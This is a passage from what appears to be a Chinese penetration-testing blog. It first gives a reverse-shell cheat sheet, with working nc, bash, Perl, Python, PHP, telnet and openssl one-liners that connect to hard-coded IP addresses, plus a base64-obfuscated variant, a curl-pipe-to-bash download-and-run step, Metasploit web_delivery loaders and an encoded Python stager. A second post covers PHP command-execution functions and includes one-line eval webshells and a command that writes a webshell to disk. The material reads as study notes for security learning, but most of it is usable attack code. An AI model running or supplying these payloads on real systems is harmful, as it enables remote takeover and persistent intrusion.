class="string">被控端使用nc将/bin/sh发送到控制端的6666端口，控制端只需要监听本地的6666端口，即可获得shell。；这是反弹shell</span></span><br></pre></td></tr></table></figure>
<p>无-e参数反弹shell（被控端</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">rm</span> <span class="string">/tmp/f;mkfifo</span> <span class="string">/tmp/f;cat</span> <span class="string">/tmp/f</span> <span class="string">|</span> <span class="string">/bin/sh</span> <span class="string">-i</span> <span class="number">2</span><span class="string">&gt;&amp;1</span> <span class="string">|</span> <span class="string">nc</span> <span class="number">139.155</span><span class="number">.49</span><span class="number">.43</span> <span class="number">6666</span> <span class="string">&gt;/tmp/f</span></span><br><span class="line"><span class="comment">#解析 mkfifo命令首先创建了一个管道，cat将管道里面的内容输出传递给/bin/bash,sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc传到该管道，由此形成一个回路。</span></span><br><span class="line"><span class="string">相关资料：https://www.cnblogs.com/old-path-white-cloud/p/11685558.html</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">mknod</span> <span class="string">backpipe</span> <span class="string">p;</span> <span class="string">nc</span> <span class="number">47.101</span><span class="number">.214</span><span class="number">.85</span> <span class="number">6666 </span><span class="number">0</span><span class="string">&lt;backpipe</span> <span class="string">|</span> <span class="string">/bin/bash</span> <span class="number">1</span><span class="string">&gt;backpipe</span> <span class="number">2</span><span class="string">&gt;backpipe</span></span><br><span class="line"><span class="comment">#相关资料：https://man.linuxde.net/mknod</span></span><br></pre></td></tr></table></figure>
<h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><p>一般我们是用图形界面和命令去控制计算机，真正能够控制计算机硬件（CPU、内存、显示器等）的只有操作系统内核（Kernel），由于安全、复杂、繁琐等原因，用户不能直接接触内核，需要另外再开发一个程序，让用户直接使用这个程序；该程序的作用就是接收用户的操作（点击图标、输入命令），并进行简单的处理，然后再传递给内核，内核和用户之间就多了一层“中间代理”，Shell 其实就是一种脚本语言，也是一个可以用来连接内核和用户的软件，我们编写完源码后不用编译，直接运行源码即可。</p>
<p>常用的Shell：bash由 GNU 组织开发，sh 是 UNIX 上的标准 shell，是第一个流行的 Shell，bash保持了对 sh shell 的兼容性，是各种 Linux 发行版默认配置的 shell。现在sh 已经基本被 bash 代替，bash是sh的扩展补充，但是也有些是不兼容的，大多数情况下区别不大，特殊场景可以使用 bash 代替 sh。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">被控端：</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/47.101.214.85/6666 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">控制端：</span><br><span class="line">nc –lvvp 6666</span><br><span class="line"></span><br><span class="line">被控端：</span><br><span class="line">exec 5&lt;&gt;/dev/tcp/139.155.49.43/6666;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br><span class="line"></span><br><span class="line">控制端：</span><br><span class="line">nc –lvvp 6666</span><br><span class="line"></span><br><span class="line">base64编码绕过：</span><br><span class="line">bash -c &quot;echo YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDEuMjE0Ljg1LzY2NjYgMD4mMQ==|base64 -d|bash -i&quot;</span><br></pre></td></tr></table></figure>
<h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">perl -e &#x27;use Socket;$i=&quot;47.101.214.85&quot;;$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br><span class="line">perl -MIO -e &#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;47.101.214.85:6666&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="Curl"><a href="#Curl" class="headerlink" title="Curl"></a>Curl</h3><p>curl是一个非常实用的、用来与服务器之间传输数据的工具；支持的协议包括 (DICT, FILE, FTP, FTPS, GOPHER, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, POP3, POP3S, RTMP, RTSP, SCP, SFTP, SMTP, SMTPS, TELNET and TFTP)，curl设计为无用户交互下完成工作；curl提供了一大堆非常有用的功能，包括代理访问、用户认证、ftp上传下载、HTTP POST、SSL连接、cookie支持、断点续传…。</p>
<p>vps</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">root@VM-0-2-ubuntu:~#</span> <span class="string">cat</span> <span class="string">index.html</span></span><br><span class="line"><span class="string">bash</span> <span class="string">-i</span> <span class="string">&gt;&amp;</span> <span class="string">/dev/tcp/139.155.49.43/6666</span> <span class="number">0</span><span class="string">&gt;&amp;1</span></span><br><span class="line"></span><br><span class="line"><span class="string">root@VM-0-2-ubuntu:~#</span> <span class="string">python3</span> <span class="string">-m</span> <span class="string">http.server</span></span><br><span class="line"><span class="string">Serving</span> <span class="string">HTTP</span> <span class="string">on</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> <span class="string">port</span> <span class="number">8000</span> <span class="string">(http://0.0.0.0:8000/)</span> <span class="string">...</span></span><br><span class="line"><span class="number">47.101</span><span class="number">.214</span><span class="number">.85</span> <span class="bullet">-</span> <span class="bullet">-</span> [<span class="number">03</span><span class="string">/Dec/2020</span> <span class="number">09</span><span class="string">:21:39</span>] <span class="string">&quot;GET /index.html HTTP/1.1&quot;</span> <span class="number">200</span> <span class="bullet">-</span></span><br></pre></td></tr></table></figure>
<p>target</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">curl</span> <span class="number">139.155</span><span class="number">.49</span><span class="number">.43</span><span class="string">:8000|bash</span></span><br><span class="line"><span class="string">或</span></span><br><span class="line"><span class="string">curl</span> <span class="string">http://139.155.49.43:8000/index.html|bash</span></span><br></pre></td></tr></table></figure>
<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">python</span> <span class="string">-c</span> <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;47.101.214.85&quot;,6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">msfvenom</span> <span class="string">-p</span> <span class="string">python/meterpreter/reverse_tcp</span> <span class="string">LHOST=139.155.49.43</span> <span class="string">LPORT=6666</span> <span class="string">-f</span> <span class="string">raw</span></span><br><span class="line"></span><br><span class="line"><span class="string">handler</span> <span class="string">-p</span> <span class="string">python/meterpreter/reverse_tcp</span> <span class="string">-H</span> <span class="number">139.155</span><span class="number">.49</span><span class="number">.43</span> <span class="string">-P</span> <span class="number">6666</span></span><br><span class="line"></span><br><span class="line"><span class="string">use</span> <span class="string">exploit/multi/script/web_delivery</span></span><br><span class="line"><span class="string">msf5</span> <span class="string">exploit(multi/script/web_delivery)</span> <span class="string">&gt;</span> <span class="string">set</span> <span class="string">target</span> <span class="number">0</span></span><br><span class="line"><span class="string">msf5</span> <span class="string">exploit(multi/script/web_delivery)</span> <span class="string">&gt;</span> <span class="string">set</span> <span class="string">payload</span> <span class="string">python/meterpreter/reverse_tcp</span></span><br><span class="line"><span class="string">msf5</span> <span class="string">exploit(multi/script/web_delivery)</span> <span class="string">&gt;</span> <span class="string">set</span> <span class="string">lport</span> <span class="number">8888</span></span><br><span class="line"><span class="string">msf5</span> <span class="string">exploit(multi/script/web_delivery)</span> <span class="string">&gt;</span> <span class="string">exploit</span> <span class="string">–j</span></span><br><span class="line"></span><br><span class="line"><span class="string">python</span> <span class="string">-c</span> <span class="string">&quot;import sys;import ssl;u=__import__(&#x27;urllib&#x27;+&#123;2:&#x27;&#x27;,3:&#x27;.request&#x27;&#125;[sys.version_info[0]],fromlist=(&#x27;urlopen&#x27;,));r=u.urlopen(&#x27;http://139.155.49.43:8080/pWMAajktf&#x27;, context=ssl._create_unverified_context());exec(r.read());&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">exec(__import__(&#x27;zlib&#x27;).decompress(__import__(&#x27;base64&#x27;).b64decode(__import__(&#x27;codecs&#x27;).getencoder(&#x27;utf-8&#x27;)(&#x27;eNo9UE1LxDAQPTe/orckGMPWbQu7bAURDyIiuN5EpE1ntTRNQiarVfG/25DFOczwZt68+RgmZ33I0aoRgvjWQye6FqEuBQZ/VEGEYQJysD6f88HkvjVvwIoV35Is+K/FZ9ikZpkCuxAnvH+4vnvdPz3eXN3zyJPKGgMqMEaL9UYWVSXLjSzXVNSL8cjpPLQjyWBW4EIUj9MlagDHKk50k5aSR+NaNTJ6eUsFSg/qg5WcP69eSN+csObk833QkGswrOc7vcj1Z//V85TmBGZQLN4te1B2ch4QWXqB7OoyJnuITPFDkW7xl5M/KpNfQg==&#x27;)[0])))</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">php</span> <span class="string">-r</span> <span class="string">&#x27;$sock=fsockopen(&quot;47.101.214.85&quot;,7777);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">msfvenom</span> <span class="string">-p</span> <span class="string">php/bind_php</span> <span class="string">lport=6666</span> <span class="string">-f</span> <span class="string">raw</span> <span class="string">&gt;</span> <span class="string">bind_php.php</span></span><br><span class="line"></span><br><span class="line"><span class="string">use</span> <span class="string">exploit/multi/script/web_delivery</span></span><br><span class="line"><span class="string">msf5</span> <span class="string">exploit(multi/script/web_delivery)</span> <span class="string">&gt;</span> <span class="string">set</span> <span class="string">target</span> <span class="number">1</span></span><br><span class="line"><span class="string">msf5</span> <span class="string">exploit(multi/script/web_delivery)</span> <span class="string">&gt;</span> <span class="string">set</span> <span class="string">payload</span> <span class="string">php/meterpreter/reverse_tcp</span></span><br><span class="line"><span class="string">msf5</span> <span class="string">exploit(multi/script/web_delivery)</span> <span class="string">&gt;</span> <span class="string">exploit</span> <span class="string">–j</span></span><br><span class="line"></span><br><span class="line"><span class="string">php</span> <span class="string">-d</span> <span class="string">allow_url_fopen=true</span> <span class="string">-r</span> <span class="string">&quot;eval(file_get_contents(&#x27;http://139.155.49.43:8080/RRfKpX&#x27;, false, stream_context_create([&#x27;ssl&#x27;=&gt;[&#x27;verify_peer&#x27;=&gt;false,&#x27;verify_peer_name&#x27;=&gt;false]])));&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">msfvenom</span> <span class="string">-p</span> <span class="string">cmd/unix/bind_ruby</span> <span class="string">lport=6666</span> <span class="string">-f</span> <span class="string">raw</span></span><br></pre></td></tr></table></figure>
<h3 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h3><p><code>telnet</code>（Teletype Network)是一种网络协议，用于在远程主机和本地计算机之间建立文本式连接。它最初于1969年开发，是Internet的早期协议之一。<code>telnet</code>命令使用TCP/IP网络通过端口23建立连接，提供了一种通过命令行界面管理远程系统的方式。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">攻击机：</span></span><br><span class="line"><span class="string">nc</span> <span class="string">-lvvp</span> <span class="number">5555</span></span><br><span class="line"><span class="string">nc</span> <span class="string">-lvvp</span> <span class="number">6666</span></span><br><span class="line"></span><br><span class="line"><span class="string">目标机：</span> </span><br><span class="line"><span class="string">telnet</span> <span class="number">47.101</span><span class="number">.214</span><span class="number">.85</span> <span class="number">5555</span> <span class="string">|</span> <span class="string">/bin/bash</span> <span class="string">|</span> <span class="string">telnet</span> <span class="number">47.101</span><span class="number">.214</span><span class="number">.85</span> <span class="number">6666</span></span><br></pre></td></tr></table></figure>
<h3 id="OpenSSL"><a href="#OpenSSL" class="headerlink" title="OpenSSL"></a>OpenSSL</h3><p>1. openssl是一个安全套接字层密码库，囊括主要的密码算法、常用密钥、证书封装管理功能及实现ssl协议。OpenSSL整个软件包大概可以分成三个主要的功能部分：SSL协议库libssl、应用程序命令工具以及密码算法库libcrypto。<br>2. SSL：Secure Socket Layer，安全套接字层协议，分为SSLv2和SSLv3两个版本，TSL在SSL3.0基础之上提出的安全通信标准化版。主要是为了加密传输数据而产生的协议，能使用户/服务器应用之间的通信不被攻击者窃听，并且始终对服务器进行认证，还可选择对用户进行认证。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">远程主机生成密钥文件</span></span><br><span class="line"><span class="string">openssl</span> <span class="string">req</span> <span class="string">-x509</span> <span class="string">-newkey</span> <span class="string">rsa:4096</span> <span class="string">-keyout</span> <span class="string">key.pem</span> <span class="string">-out</span> <span class="string">cert.pem</span> <span class="string">-days</span> <span class="number">365</span> <span class="string">-nodes</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">远程攻击主机启动监视器</span></span><br><span class="line"><span class="string">openssl</span> <span class="string">s_server</span> <span class="string">-quiet</span> <span class="string">-key</span> <span class="string">key.pem</span> <span class="string">-cert</span> <span class="string">cert.pem</span> <span class="string">-port</span> <span class="number">443</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">目标机上反弹shell</span><br><span class="line">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;ATTACKER-IP&gt;:&lt;PORT&gt; &gt; /tmp/s; rm /tmp/s</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>渗透</tag>
        <tag>日记</tag>
        <tag>反弹shell</tag>
      </tags>
  </entry>
  <entry>
    <title>命令执行</title>
    <url>/posts/a0000002.html</url>
    <content><![CDATA[<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="原因："><a href="#原因：" class="headerlink" title="原因："></a>原因：</h2><p>分为命令执行漏洞和代码执行漏洞</p>
<p>后端代码没有对用户输入的参数进行严格过滤，导致参数被拼接到命令执行函数中。攻击者可以通过命令执行漏洞在目标服务器执行任意命令</p>
<p>执行的是服务端代码如phpinfo（），而命令执行漏洞执行的是系统命令如whoami</p>
<h2 id="危害："><a href="#危害：" class="headerlink" title="危害："></a>危害：</h2><ol>
<li>继承web服务程序的权限去执行系统命令或读写文件</li>
<li>反弹shell，获得目标服务器的权限</li>
<li>进一步内网渗透</li>
</ol>
<h3 id="php代码执行函数"><a href="#php代码执行函数" class="headerlink" title="php代码执行函数:"></a>php代码执行函数:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.eval():eval函数传入的参数必须为php代码，既要以分号结尾；如果想执行系统命令，必须加上命令执行函数如system(“命令”);</span><br><span class="line">2.assert():适用于php5版本 php7.0可以用配置文件去掉assert的代码执行，php7.1不能执行代码， php7.2不能传入字符串参数。功能：检测一个断言是否为false</span><br><span class="line">3.call_user_func()：回调函数</span><br><span class="line">4.call_user_func_array()</span><br><span class="line">5.preg_replace:php&gt;5.5不再支持,正则表达式替换函数</span><br><span class="line">6.array_map</span><br></pre></td></tr></table></figure>
<p>1.eval：eval函数传入的参数必须为php代码，既要以分号结尾；如果想执行系统命令，必须加上命令执行函数如system(“命令”);</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">eval</span> <span class="string">(</span> <span class="string">string</span> <span class="string">$code</span> <span class="string">)</span></span><br><span class="line"><span class="string">&lt;?php</span> <span class="string">@eval($_POST[&#x27;cmd&#x27;]);?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240606110351170.png" alt="image-20240606110351170"></p>
<p>2.assert：适用于php5版本 php7.0可以用配置文件去掉assert的代码执行，php7.1不能执行代码， php7.2不能传入字符串参数。功能：检测一个断言是否为false</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">assert</span> <span class="string">(</span> <span class="string">mixed</span> <span class="string">$assertion</span> [, <span class="string">string</span> <span class="string">$description</span> ] <span class="string">)</span></span><br><span class="line"><span class="comment">#如果assertion是字符串，将会被assert()当做php代码来执行；不需要分号结尾</span></span><br><span class="line"><span class="string">&lt;?php</span> <span class="string">@assert($_POST[&#x27;cmd&#x27;])?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240606110433397.png" alt="image-20240606110433397"></p>
<p>3.call_user_func</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">call_user_func</span> <span class="string">(</span> <span class="string">callable</span> <span class="string">$callback</span> [, <span class="string">mixed</span> <span class="string">$parameter</span> [, <span class="string">mixed</span> <span class="string">$...</span> ]] <span class="string">)</span></span><br><span class="line"><span class="comment">#第一个参数callback是被调用的回调函数，其余参数是回调函数的参数</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">call_user_func(&quot;assert&quot;,$_POST[&#x27;cmd&#x27;]);</span></span><br><span class="line"><span class="string">//传入的参数作为assert函数的参数</span></span><br><span class="line"><span class="string">//cmd=system(whoami)</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240606110537293.png" alt="image-20240606110537293"></p>
<p>4.call_user_func_array</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">call_user_func_array</span> <span class="string">(</span> <span class="string">callable</span> <span class="string">$callback</span> <span class="string">,</span> <span class="string">array</span> <span class="string">$param_arr</span> <span class="string">)</span></span><br><span class="line"><span class="comment">#把第一个参数作为回调函数（callback）调用，把参数数组做（param_arr）作为回调函数的参数传入</span></span><br><span class="line"><span class="string">&lt;?php</span> </span><br><span class="line"><span class="string">$cmd=$_POST[&#x27;cmd&#x27;];</span></span><br><span class="line"><span class="string">$array[0]=$cmd;</span></span><br><span class="line"><span class="string">call_user_func_array(&quot;assert&quot;,$array);</span></span><br><span class="line"><span class="string">//将传入的参数作为数组的第一个值传递给assert函数</span></span><br><span class="line"><span class="string">//cmd=system(whoami)</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240606110622075.png" alt="image-20240606110622075"></p>
<p>5.preg_replace:php&gt;5.5不再支持</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#正则表达式替换函数，当第一个参数使用“/e”作为修饰符，会把第二个参数作为字符串当作php代码执行</span></span><br><span class="line"><span class="string">preg_replace(&quot;/abc/e&quot;,</span> <span class="string">$_REQUEST[&#x27;cmd&#x27;],</span> <span class="string">&quot;abc&quot;</span><span class="string">);</span></span><br><span class="line"><span class="comment">#第三个参数要能够满足第一个参数匹配的字符串，不会写，可以尽量和第一个参数里的保持一致</span></span><br><span class="line"><span class="comment">#特殊用法：</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">if(isset($_GET[&#x27;data&#x27;]))</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">$data</span> <span class="string">=</span> <span class="string">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]<span class="string">;</span></span><br><span class="line"><span class="string">$data</span> <span class="string">=</span> <span class="string">preg_replace(&#x27;/(.*)/e&#x27;</span>, <span class="string">&#x27;strtoupper(&quot;\\1&quot;)&#x27;</span>,<span class="string">$data);</span></span><br><span class="line"><span class="string">//</span> <span class="string">$data</span> <span class="string">=</span> <span class="string">preg_replace(&#x27;/(.*)/e&#x27;</span>, <span class="string">&#x27;strtoupper(&#x27;</span><span class="string">\\1&#x27;)&#x27;</span>,<span class="string">$data);</span></span><br><span class="line"><span class="string">print</span> <span class="string">$data;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="string">//</span> <span class="string">通过正则表达式把输入的结果$data放入了缓冲区，使用strtoupper(&quot;\\1&quot;)进行读取</span></span><br><span class="line"><span class="string">//</span> <span class="string">/e</span> <span class="string">修正符使</span> <span class="string">preg_replace()</span> <span class="string">将</span> <span class="string">replacement</span> <span class="string">参数当作</span> <span class="string">PHP</span> <span class="string">代码</span></span><br><span class="line"><span class="string">//</span> <span class="string">?data=[php]&#123;$&#123;system(ipconfig)&#125;&#125;[/php]</span></span><br><span class="line"><span class="string">//</span> <span class="string">在php中，双引号里面如果包含有变量，php解释器会将其替换为变量解释后的结果；单引号中的变量不会被处理。</span></span><br><span class="line"><span class="string">//</span> <span class="string">注意：双引号中的函数不会被执行和替换。</span></span><br><span class="line"><span class="string">//</span> <span class="string">防御：将</span> <span class="string">strtoupper(&quot;\\1&quot;)</span> <span class="string">修改为strtoupper(&#x27;\\1&#x27;),这样&#x27;$&#123;phpinfo()&#125;&#x27;就会被当做一个普通的字符串处理（单引号中的变量不会被处理）</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240606111242087.png" alt="image-20240606111242087"></p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240606112555632.png" alt="image-20240606112555632"></p>
<p>6.array_map</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">$function_name</span> <span class="string">=</span> <span class="string">$_POST[&#x27;func&#x27;];</span>  <span class="string">//</span> <span class="string">从post参数func获取函数名</span></span><br><span class="line"><span class="string">$function_args</span> <span class="string">=</span> <span class="string">$_POST[&#x27;args&#x27;];</span>  <span class="string">//</span> <span class="string">从post参数args获取参数值</span></span><br><span class="line"><span class="string">$arr[0]</span> <span class="string">=</span> <span class="string">$function_args;</span>        <span class="string">//</span> <span class="string">把参数值换成数组</span></span><br><span class="line"><span class="string">array_map($function_name,</span> <span class="string">$arr);</span> <span class="string">//</span> <span class="string">array_map执行</span> <span class="string">func(args);</span></span><br><span class="line"><span class="string">使用方法：</span></span><br><span class="line"><span class="attr">body:</span></span><br><span class="line"><span class="string">func=system&amp;args=whoami</span>  <span class="string">//</span>  <span class="string">system(&quot;whoami&quot;);</span></span><br><span class="line"><span class="string">func=phpinfo&amp;args=1</span> <span class="string">//</span> <span class="string">phpinfo(1);</span></span><br></pre></td></tr></table></figure>
<p>呃，这里eval不是函数，特别标记一下，所以不能传进去该获取shell函数</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240606113503838.png" alt="image-20240606113503838"></p>
<h3 id="常见系统命令执行函数："><a href="#常见系统命令执行函数：" class="headerlink" title="常见系统命令执行函数："></a>常见系统命令执行函数：</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">system()：执行外部程序，并且显示输出；</span></span><br><span class="line"><span class="string">exec()：执行一个外部程序</span></span><br><span class="line"><span class="string">shell_exec()：通过</span> <span class="string">shell</span> <span class="string">环境执行命令，并且将完整的输出以字符串的方式返回。</span></span><br><span class="line"><span class="string">passthru()：执行unix系统命令并且显示原始输出</span></span><br><span class="line"><span class="string">pcntl_exec()：在当前进程空间执行指定程序</span></span><br><span class="line"><span class="string">popen()：打开进程文件指针</span></span><br><span class="line"><span class="string">proc_open()：执行一个命令，并且打开用来输入/输出的文件指针。</span></span><br></pre></td></tr></table></figure>
<p>1.system</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">system</span> <span class="string">(</span> <span class="string">string</span> <span class="string">$command</span> [, <span class="string">int</span> <span class="string">&amp;$return_var</span> ] <span class="string">)</span></span><br><span class="line"><span class="comment">#执行系统外部命令，并直接将结果输出到浏览器，第二个参数是返回值；true or false</span></span><br><span class="line"><span class="string">system（&#x27;ls&#x27;）</span>	<span class="comment">#会直接返回当前文件下的目录。该函数提交命令自己回显</span></span><br></pre></td></tr></table></figure>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240606114603740.png" alt="image-20240606114603740"></p>
<p>2.exec:无回显；</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">exec</span> <span class="string">(</span> <span class="string">string</span> <span class="string">$command</span> [, <span class="string">array</span> <span class="string">&amp;$output</span> [, <span class="string">int</span> <span class="string">&amp;$return_var</span> ]] <span class="string">)</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">//</span> <span class="string">输出运行中的</span> <span class="string">php/httpd</span> <span class="string">进程的创建者用户名</span></span><br><span class="line"><span class="string">//</span> <span class="string">（在可以执行</span> <span class="string">&quot;whoami&quot;</span> <span class="string">命令的系统上）</span></span><br><span class="line"><span class="string">//</span> <span class="string">echo</span> <span class="string">exec(&#x27;whoami&#x27;);</span></span><br><span class="line"><span class="string">//</span> <span class="string">exec(&#x27;ls</span> <span class="string">-la&#x27;,</span> <span class="string">$return);</span></span><br><span class="line"><span class="string">//</span> <span class="string">var_dump($return);</span></span><br><span class="line"></span><br><span class="line"><span class="string">$cmd=$_POST[&#x27;cmd&#x27;];</span></span><br><span class="line"><span class="string">@exec($cmd,</span> <span class="string">$return);</span></span><br><span class="line"><span class="string">var_dump($return)</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240606120447147.png" alt="image-20240606120447147"></p>
<p>3.passthru（读取二进制流）：system()的平替，写个命令就会执行命令，自己能回显</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">passthru(&quot;whoami&quot;); </span><br><span class="line"></span><br><span class="line">passthru($_REQUEST[&#x27;cmd&#x27;]);</span><br></pre></td></tr></table></figure>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240606134756260.png" alt="image-20240606134756260"></p>
<p>4.shell_exec和反引号``:不能自己回显，需要借用echo\print等输出结果</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">shell_exec（ls）</span></span><br><span class="line"><span class="string">`ls`</span></span><br></pre></td></tr></table></figure>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240606135014879.png" alt="image-20240606135014879"></p>
<p>5.popen:语法为popen(string command, string mode),command参数: 要执行的命令,mode参数: 模式’r’表示阅读，’w’ 表示写入。不能自己回显，需要print_r等输出内容</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">popen(&quot;whoami&quot;,&#x27;r&#x27;);</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240606135246524.png" alt="image-20240606135246524"></p>
<p>6.proc_popen</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">proc_open($command,$descriptor</span> <span class="string">spec,$pipes,$cwd,$env</span> <span class="string">vars,$options)</span></span><br><span class="line"><span class="string">$command是要执行的命令。</span></span><br><span class="line"><span class="string">$descriptorspec是一个描述符规范数组，用于指定进程的输入、输出和错误的文件描述符。</span></span><br><span class="line"><span class="string">$pipes是一个引用变量，用于存储与进程相关的管道。</span></span><br><span class="line"><span class="string">$cwd（可选）是设置子进程的当前工作目录。</span></span><br><span class="line"><span class="string">$env（可选）是设置子进程的环境变量。</span></span><br><span class="line"><span class="string">$other_options（可选）是其他选项，如设置超时等。</span></span><br></pre></td></tr></table></figure>
<p>7.pcntl_exec:语法格式为pcntl exec(string path, array args = ?, array $envs = ?)<br>path必须时可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本 (比如文件第一行是#!/usr/local/bin/perl的perl脚本)。args是一个要传递给程序的参数的字符串数组。<br>envs是一个要传递给程序作为环境变量的字符串数组。这个数组是 key =&gt; value格式的，key代表要传递的环境变量的名称，value代表该环境变量值。该函数没有回显，</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">解决方法一：cat文件并输出到有权限读取路径；</span></span><br><span class="line"><span class="string">解决方法二：shell反弹</span></span><br></pre></td></tr></table></figure>
<h2 id="命令执行写webshell"><a href="#命令执行写webshell" class="headerlink" title="命令执行写webshell"></a>命令执行写webshell</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">windows：</span></span><br><span class="line"><span class="string">echo</span> <span class="string">&quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span> <span class="string">&gt;</span> <span class="string">webshell.php</span></span><br></pre></td></tr></table></figure>
